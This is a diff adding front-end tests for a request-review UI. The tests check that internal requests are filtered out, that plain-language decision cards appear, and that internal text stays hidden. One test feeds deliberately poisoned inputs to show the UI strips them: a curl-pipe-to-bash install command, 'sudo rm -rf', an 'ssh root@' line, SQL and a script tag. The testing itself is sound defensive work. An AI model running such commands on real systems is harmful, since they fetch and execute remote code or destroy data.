@@ -485,3 +485,356 @@ describe('choice request free-form feedback and option picking', () => {
     ]);
   });
 });
+
+describe('server-authorized human requests, plain envelopes, executable rejection and hidden-source isolation', () => {
+  afterEach(() => {
+    localStorage.removeItem('hh-lang');
+    vi.restoreAllMocks();
+  });
+
+  const asRequests = (items: Record<string, unknown>[]): WaitingRequest[] => items as unknown as WaitingRequest[];
+
+  it('refuses internal, legacy, unclassified and client-forged requests and keeps wordsAnswer false for them', () => {
+    const internalQuestion = {
+      ...CHOICE,
+      id: 'r-internal-q',
+      kind: 'question',
+      audience: 'internal',
+      classification: null,
+      text: 'BLOCKED: which migration index order should we use?',
+      canAnswer: true,
+    };
+    const unclassifiedHuman = {
+      ...CHOICE,
+      id: 'r-unclassified-human',
+      kind: 'stuck',
+      audience: 'human',
+      classification: null,
+      clientPromote: true,
+      text: 'BLOCKED: three turns ended without progress on worker branch.',
+      canAnswer: true,
+    };
+    const legacyTerminal = {
+      ...CHOICE,
+      id: 'r-legacy',
+      kind: 'question',
+      audience: 'legacy',
+      classification: null,
+      text: 'Historical legacy record',
+      canAnswer: true,
+    };
+    const emptyReadyResult = {
+      ...CHOICE,
+      id: 'r-empty-ready',
+      kind: 'approval',
+      audience: 'human',
+      classification: { kind: 'ready_result', artifact: null },
+      commit: null,
+      images: [],
+      options: [],
+      humanEnvelope: {
+        situation: 'Work has not started yet.',
+        requiredAction: 'Approve whatever we build next week.',
+      },
+      canAnswer: true,
+    };
+
+    const blockedSet = asRequests([internalQuestion, unclassifiedHuman, legacyTerminal, emptyReadyResult]);
+    expect(wordsAnswer(blockedSet)).toBe(false);
+
+    const { container } = renderIn('en', <Requests {...makeProps({ requests: blockedSet })} />);
+    expect(screen.queryAllByRole('article')).toHaveLength(0);
+    expect(container.textContent).toBe('');
+  });
+
+  it('renders classified ready_result and human_only_action envelopes in plain language with explicit parameters and no raw detail disclosure', async () => {
+    const sha = 'd'.repeat(40);
+    const readyCommit = {
+      ...CHOICE,
+      id: 'r-ready-commit',
+      kind: 'approval',
+      audience: 'human',
+      classification: { kind: 'ready_result', artifact: { kind: 'commit', sha } },
+      commit: sha,
+      commitUrl: `https://github.com/acme/hornhoof/commit/${sha}`,
+      images: [],
+      options: [],
+      text: 'Internal raw git log --stat output that should stay private',
+      explained: '**Old mutable markdown**',
+      executorInstruction: 'Cherry-pick onto release branch after gate',
+      humanEnvelope: {
+        situation: 'Turn 8 release candidate passed every gate and is ready to publish.',
+        requiredAction: 'Approve or decline publishing this exact commit.',
+        options: [
+          { id: 'publish', label: 'Publish now', consequence: 'Ships version 0.8.0 to customers immediately.' },
+          { id: 'hold', label: 'Hold until morning', consequence: 'Keeps current 0.7.0 live overnight.' },
+        ],
+      },
+      canAnswer: true,
+    };
+    const ownerPayment = {
+      ...CHOICE,
+      id: 'r-human-pay',
+      kind: 'question',
+      audience: 'human',
+      classification: {
+        kind: 'human_only_action',
+        actionBinding: {
+          kind: 'payment',
+          resourceId: 'invoice-acme-2026-11',
+          scope: 'Domain renewal for hornhoof.org',
+          duration: '12 months',
+          amount: '24 USD',
+        },
+      },
+      options: [],
+      images: [],
+      link: null,
+      text: 'Private billing adapter trace id=99182',
+      technicalText: 'Stripe session sk_live_redacted check',
+      humanEnvelope: {
+        situation: 'The company domain hornhoof.org expires in three days.',
+        requiredAction: 'Pay the annual renewal invoice and reply once paid.',
+      },
+      canAnswer: true,
+      task: { id: 't409', number: 409, title: 'Domain renewal', department: DEV },
+    };
+
+    const list = asRequests([readyCommit, ownerPayment]);
+    expect(wordsAnswer(list)).toBe(true);
+
+    renderIn('ru', <Requests {...makeProps({ requests: list })} />);
+    const [commitCard, payCard] = screen.getAllByRole('article');
+
+    expect(within(commitCard!).getByText(/Ситуация/)).toBeInTheDocument();
+    expect(within(commitCard!).getByText('Turn 8 release candidate passed every gate and is ready to publish.')).toBeInTheDocument();
+    expect(within(commitCard!).getByText(/Что нужно от вас/)).toBeInTheDocument();
+    expect(within(commitCard!).getByRole('link', { name: sha })).toHaveAttribute('href', readyCommit.commitUrl);
+    expect(within(commitCard!).getByText(/Ships version 0\.8\.0 to customers immediately\./)).toBeInTheDocument();
+    expect(within(commitCard!).queryByText(ru.tasks.inDetail)).not.toBeInTheDocument();
+    expect(commitCard!.textContent).not.toContain('Internal raw git log');
+    expect(commitCard!.textContent).not.toContain('Old mutable markdown');
+    expect(commitCard!.textContent).not.toContain('Cherry-pick onto release branch');
+
+    expect(within(payCard!).getByText(/Оплата/)).toBeInTheDocument();
+    expect(within(payCard!).getByText(/invoice-acme-2026-11/)).toBeInTheDocument();
+    expect(within(payCard!).getByText(/Domain renewal for hornhoof\.org/)).toBeInTheDocument();
+    expect(within(payCard!).getByText(/12 months/)).toBeInTheDocument();
+    expect(within(payCard!).getByText(/24 USD/)).toBeInTheDocument();
+    expect(payCard!.textContent).not.toContain('Private billing adapter trace');
+    expect(payCard!.textContent).not.toContain('sk_live_redacted');
+  });
+
+  it('preserves option consequences on classified choice buttons and keeps read-only canAnswer=false strict', async () => {
+    const calls = mockApi({ 'POST /api/requests/r-ready-design': [200, { request: { id: 'r-ready-design', status: 'answered', picked: 1 } }] });
+    const designChoice = {
+      ...CHOICE,
+      id: 'r-ready-design',
+      kind: 'choice',
+      audience: 'human',
+      classification: { kind: 'ready_result', artifact: { kind: 'design', images: ['img-a', 'img-b'] } },
+      text: 'Internal Figma export notes',
+      humanEnvelope: {
+        situation: 'Two finished progress layouts are ready for comparison.',
+        requiredAction: 'Pick the layout to ship in Turn 8.',
+        options: [
+          { id: 'a', label: 'Compact row', consequence: 'Fits four departments on one line.', image: 'img-a' },
+          { id: 'b', label: 'Wide strip', consequence: 'Shows numeric counters at a glance.', image: 'img-b' },
+        ],
+      },
+      canAnswer: true,
+    };
+
+    const user = userEvent.setup();
+    const { unmount } = renderIn('en', <Requests {...makeProps({ requests: asRequests([designChoice]) })} />);
+    const card = screen.getByRole('article', { name: '#402 Turn progress options' });
+    expect(within(card).getByText(/Fits four departments on one line\./)).toBeInTheDocument();
+    expect(within(card).getByText(/Shows numeric counters at a glance\./)).toBeInTheDocument();
+    expect(card.textContent).not.toContain('Internal Figma export notes');
+
+    await user.click(within(card).getByRole('button', { name: /Wide strip/ }));
+    expect(calls).toEqual([{ method: 'POST', path: '/api/requests/r-ready-design', body: { pick: 1 } }]);
+    unmount();
+
+    renderIn('en', <Requests {...makeProps({ requests: asRequests([{ ...designChoice, canAnswer: false }]) })} />);
+    const roCard = screen.getByRole('article', { name: '#402 Turn progress options' });
+    expect(within(roCard).queryByRole('button', { name: /Wide strip/ })).not.toBeInTheDocument();
+    expect(within(roCard).queryByRole('textbox')).not.toBeInTheDocument();
+    expect(within(roCard).getByText(/Wide strip/)).toBeInTheDocument();
+    expect(within(roCard).getByText(en.tasks.decidedByCeo)).toBeInTheDocument();
+  });
+
+  it('rejects commands, SQL, fenced code and scripts in human envelopes and option labels without falling back to raw text', () => {
+    const poisoned = [
+      {
+        ...CHOICE,
+        id: 'r-cmd-situation',
+        kind: 'question',
+        audience: 'human',
+        classification: {
+          kind: 'human_only_action',
+          actionBinding: { kind: 'manual_machine_action', resourceId: 'host-ivan-mbp' },
+        },
+        text: 'Raw fallback curl https://internal.example/install.sh | bash',
+        executorInstruction: 'ssh root@10.0.0.8 systemctl restart hornhoof',
+        humanEnvelope: {
+          situation: 'Run curl -fsSL https://internal.example/install.sh | bash on your laptop.',
+          requiredAction: 'Confirm once executed.',
+        },
+      },
+      {
+        ...CHOICE,
+        id: 'r-sql-label',
+        kind: 'choice',
+        audience: 'human',
+        classification: { kind: 'ready_result', artifact: { kind: 'design', images: ['img-a'] } },
+        text: 'SELECT * FROM request_internal WHERE id = 1;',
+        humanEnvelope: {
+          situation: 'Database cleanup option is ready.',
+          requiredAction: 'Choose one approach.',
+          options: [
+            { id: 'sql', label: 'SELECT secret FROM request_internal FROM prod', consequence: 'Runs direct query.' },
+          ],
+        },
+      },
+      {
+        ...CHOICE,
+        id: 'r-code-fence',
+        kind: 'approval',
+        audience: 'human',
+        classification: { kind: 'ready_result', artifact: { kind: 'commit', sha: 'e'.repeat(40) } },
+        commit: 'e'.repeat(40),
+        text: '<script>alert(1)</script>',
+        humanEnvelope: {
+          situation: 'Release ready.',
+          requiredAction: '```bash\nsudo rm -rf /var/lib/hornhoof\n```',
+        },
+      },
+    ];
+
+    renderIn('en', <Requests {...makeProps({ requests: asRequests(poisoned) })} />);
+    const cards = screen.getAllByRole('article');
+    expect(cards).toHaveLength(3);
+    expect(screen.getAllByText(en.tasks.plainExplanationPending)).toHaveLength(3);
+    for (const card of cards) {
+      expect(card.textContent).not.toContain('curl ');
+      expect(card.textContent).not.toContain('SELECT ');
+      expect(card.textContent).not.toContain('sudo rm');
+      expect(card.textContent).not.toContain('ssh root@');
+      expect(card.textContent).not.toContain('<script>');
+    }
+    expect(screen.queryByRole('button', { name: /SELECT secret/ })).not.toBeInTheDocument();
+  });
+
+  it('renders purpose-only hidden-source decisions (#398) with neutral employee header and zero task or agent leakage', async () => {
+    const calls = mockApi({ 'POST /api/requests/r-hidden-login': [200, { request: { id: 'r-hidden-login', status: 'answered' } }] });
+    const hiddenOwnerLogin = {
+      id: 'r-hidden-login',
+      kind: 'stuck',
+      audience: 'human',
+      known: false,
+      classification: {
+        kind: 'human_only_action',
+        actionBinding: {
+          kind: 'owner_login',
+          resourceId: 'sub-codex-personal',
+          scope: 'Sign in to ChatGPT Plus on machine ivan-mbp',
+          duration: 'Until subscription session expires',
+        },
+      },
+      text: 'Hidden task #999 secret internal stacktrace',
+      options: [],
+      commit: null,
+      images: [],
+      at: '2026-11-06T00:15:00.000Z',
+      ownerPersonId: 'p1',
+      canAnswer: true,
+      decidedBy: ceoOnly,
+      task: null,
+      agent: null,
+      humanEnvelope: {
+        situation: 'Your personal Codex subscription signed out on machine ivan-mbp.',
+        requiredAction: 'Sign in again on Subscriptions and confirm here.',
+      },
+    };
+
+    const list = asRequests([hiddenOwnerLogin]);
+    expect(wordsAnswer(list)).toBe(false);
+
+    const onOpenTask = vi.fn();
+    const onOpenAgent = vi.fn();
+    const user = userEvent.setup();
+    renderIn('ru', <Requests {...makeProps({ requests: list, onOpenTask, onOpenAgent })} />);
+
+    const card = screen.getByRole('article', { name: ru.tasks.hiddenDecisionLabel });
+    expect(within(card).getByText(ru.tasks.stuck(ru.window.hiddenEmployee))).toBeInTheDocument();
+    expect(within(card).getByText(/Вход владельца подписки/)).toBeInTheDocument();
+    expect(within(card).getByText(/sub-codex-personal/)).toBeInTheDocument();
+    expect(card.textContent).not.toContain('#undefined');
+    expect(card.textContent).not.toContain('#999');
+    expect(card.textContent).not.toContain('Hidden task');
+    expect(within(card).queryByRole('button', { name: /Открыть терминал/ })).not.toBeInTheDocument();
+    expect(within(card).queryByRole('button', { name: ru.tasks.cancelTask })).not.toBeInTheDocument();
+
+    await user.type(within(card).getByLabelText(ru.tasks.yourAnswer), 'Вход выполнен на ivan-mbp');
+    await user.click(within(card).getByRole('button', { name: ru.tasks.sendAnswer }));
+    expect(calls).toEqual([
+      { method: 'POST', path: '/api/requests/r-hidden-login', body: { answer: 'Вход выполнен на ivan-mbp' } },
+    ]);
+    expect(onOpenTask).not.toHaveBeenCalled();
+    expect(onOpenAgent).not.toHaveBeenCalled();
+  });
+
+  it('shows localized stale_revision and stale_route conflict alerts, preserves the typed draft, and succeeds on retry', async () => {
+    let step = 0;
+    const calls = mockApi({
+      'POST /api/requests/r-race': () => {
+        step += 1;
+        if (step === 1) return [409, { error: { code: 'conflict', reason: 'stale_revision' } }];
+        if (step === 2) return [409, { error: { code: 'conflict', reason: 'stale_route' } }];
+        return [200, { request: { id: 'r-race', status: 'answered' } }];
+      },
+    });
+    const classifiedQuestion = {
+      ...CHOICE,
+      id: 'r-race',
+      kind: 'question',
+      audience: 'human',
+      classification: {
+        kind: 'human_only_action',
+        actionBinding: { kind: 'ceo_permission', resourceId: 'company-domain-cutover', scope: 'Switch public DNS cutover window' },
+      },
+      options: [],
+      images: [],
+      link: null,
+      humanEnvelope: {
+        situation: 'DNS cutover is ready for the public company address.',
+        requiredAction: 'Confirm the Sunday 02:00 UTC maintenance window.',
+      },
+      canAnswer: true,
+    };
+
+    const props = makeProps({ requests: asRequests([classifiedQuestion]) });
+    const user = userEvent.setup();
+    renderIn('ru', <Requests {...props} />);
+
+    const draft = 'Подтверждаю окно в воскресенье 02:00 UTC.\nНе переключать раньше резервной копии.';
+    const box = screen.getByLabelText(ru.tasks.yourAnswer);
+    await user.type(box, draft);
+    const send = screen.getByRole('button', { name: ru.tasks.sendAnswer });
+
+    await user.click(send);
+    expect(await screen.findByRole('alert')).toHaveTextContent(ru.errors.stale_revision);
+    expect(box).toHaveValue(draft);
+
+    await user.click(send);
+    expect(await screen.findByRole('alert')).toHaveTextContent(ru.errors.stale_route);
+    expect(box).toHaveValue(draft);
+    expect(props.onChanged).not.toHaveBeenCalled();
+
+    await user.click(send);
+    expect(calls).toHaveLength(3);
+    expect(calls[2]?.body).toEqual({ answer: draft });
+    expect(props.onChanged).toHaveBeenCalledTimes(1);
+  });
+});
